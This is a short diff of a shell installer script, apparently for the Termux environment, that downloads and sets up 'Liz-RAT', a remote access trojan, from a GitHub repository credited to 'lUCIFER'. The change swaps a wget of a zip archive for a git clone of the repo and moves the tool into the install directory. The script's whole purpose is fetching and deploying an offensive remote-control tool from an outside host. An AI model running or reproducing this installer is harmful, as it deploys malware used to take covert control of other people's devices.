@@ -50,14 +50,10 @@ if [ -e "$file" ]; then
   echo "${GREEN}File $file exists. NOT Downloading it${NC}"
 else
   echo "${GREEN}$file does not exist. Downloading...${NC}"
-  wget -q "https://raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
+  git clone https://github.com/Bhartiya-Hacker/Liz-RAT.git 
 fi
 sleep 5
 
-clear
-echo "${GREEN}Compiling LizRat${NC}"
-sleep 6
-unzip lizrat.zip
 clear
 
 echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
@@ -69,7 +65,7 @@ echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━
 echo "${CYN}                                  By lUCIFER   ${NC}"
 
 echo "${YLW}Setting UP Directories${NC}"
-mv -f lizrat "$PREFIX/opt"
+mv -f Liz-RAT/lizrat "$PREFIX/opt"
 echo "${GRN}Directory SETUP Complete${NC}"
 sleep 5
 clear
